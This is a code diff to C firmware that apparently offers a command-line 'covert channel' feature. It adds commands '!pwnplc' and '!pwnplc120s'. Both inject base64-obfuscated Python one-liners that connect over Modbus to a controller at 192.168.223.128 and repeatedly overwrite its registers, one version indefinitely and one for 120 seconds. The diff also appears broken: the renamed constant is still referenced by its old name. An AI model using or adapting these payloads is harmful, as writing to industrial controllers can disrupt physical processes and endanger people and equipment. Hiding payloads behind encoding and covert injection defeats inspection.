@@ -1228,7 +1228,9 @@ static void cmd_enum_active(nrf_cli_t const * p_cli, size_t argc, char **argv) {
 
 
 #define MAX_CC_PAY_SIZE 16
-const char pyPwnPLC[] = "python -c \"import base64; exec(base64.b64decode('ZnJvbSBweW1vZGJ1cy5jbGllbnQuc3luYyBpbXBvcnQgTW9kYnVzVGNwQ2xpZW50IGFzIE0NCmZyb20gcHltb2RidXMuZXhjZXB0aW9ucyBpbXBvcnQgQ29ubmVjdGlvbkV4Y2VwdGlvbg0KaW1wb3J0IG9zDQppbXBvcnQgc3lzDQppbXBvcnQgdGltZQ0KYz1NKCcxOTIuMTY4LjIyMy4xMjgnLCBwb3J0PTUwMjApDQp3aGlsZSBUcnVlOg0KICAgIHJxID0gYy53cml0ZV9yZWdpc3RlcigweDAxLCAxKQ0KICAgIHJxID0gYy53cml0ZV9yZWdpc3RlcigweDAyLCAwKQ0KICAgIHJxID0gYy53cml0ZV9yZWdpc3RlcigweDA0LCAwKQ0KICAgIHJxID0gYy53cml0ZV9yZWdpc3RlcigweDA2LCAwKQ=='))\"";
+const char PwnPLC[] = "python -c \"import base64; exec(base64.b64decode('ZnJvbSBweW1vZGJ1cy5jbGllbnQuc3luYyBpbXBvcnQgTW9kYnVzVGNwQ2xpZW50IGFzIE0NCmZyb20gcHltb2RidXMuZXhjZXB0aW9ucyBpbXBvcnQgQ29ubmVjdGlvbkV4Y2VwdGlvbg0KaW1wb3J0IG9zDQppbXBvcnQgc3lzDQppbXBvcnQgdGltZQ0KYz1NKCcxOTIuMTY4LjIyMy4xMjgnLCBwb3J0PTUwMjApDQp3aGlsZSBUcnVlOg0KICAgIHJxID0gYy53cml0ZV9yZWdpc3RlcigweDAxLCAxKQ0KICAgIHJxID0gYy53cml0ZV9yZWdpc3RlcigweDAyLCAwKQ0KICAgIHJxID0gYy53cml0ZV9yZWdpc3RlcigweDA0LCAwKQ0KICAgIHJxID0gYy53cml0ZV9yZWdpc3RlcigweDA2LCAwKQ=='))\"";
+
+const char PwnPLC120s[] = "python -c \"import base64; exec(base64.b64decode('ZnJvbSBweW1vZGJ1cy5jbGllbnQuc3luYyBpbXBvcnQgTW9kYnVzVGNwQ2xpZW50IGFzIE0NCmZyb20gcHltb2RidXMuZXhjZXB0aW9ucyBpbXBvcnQgQ29ubmVjdGlvbkV4Y2VwdGlvbg0KaW1wb3J0IG9zDQppbXBvcnQgc3lzDQppbXBvcnQgdGltZQ0KYz1NKCcxOTIuMTY4LjIyMy4xMjgnLCBwb3J0PTUwMjApCnRfZW5kID0gdGltZS50aW1lKCkgKyAxMjAKd2hpbGUgdGltZS50aW1lKCkgPCB0X2VuZDoNCiAgICBycSA9IGMud3JpdGVfcmVnaXN0ZXIoMHgwMSwgMSkNCiAgICBycSA9IGMud3JpdGVfcmVnaXN0ZXIoMHgwMiwgMCkNCiAgICBycSA9IGMud3JpdGVfcmVnaXN0ZXIoMHgwNCwgMCkNCiAgICBycSA9IGMud3JpdGVfcmVnaXN0ZXIoMHgwNiwgMCk='))\"";
 
 bool pre_cmd_callback_covert_channel(nrf_cli_t const * p_cli, char const * const p_cmd_buf) {
     if (strcmp(p_cmd_buf, "!exit") == 0) {
@@ -1237,8 +1239,12 @@ bool pre_cmd_callback_covert_channel(nrf_cli_t const * p_cli, char const * const
         return true;
     }
 
-    if (strcmp(p_cmd_buf, "!pypwnplc") == 0) {
+    if (strcmp(p_cmd_buf, "!pwnplc") == 0) {
         return pre_cmd_callback_covert_channel(p_cli, pyPwnPLC);
+    }
+    
+    if (strcmp(p_cmd_buf, "!pwnplc120s") == 0) {
+        return pre_cmd_callback_covert_channel(p_cli, PwnPLC120s);
     }
 
     covert_channel_payload_data_t tmp_tx_data = {0};
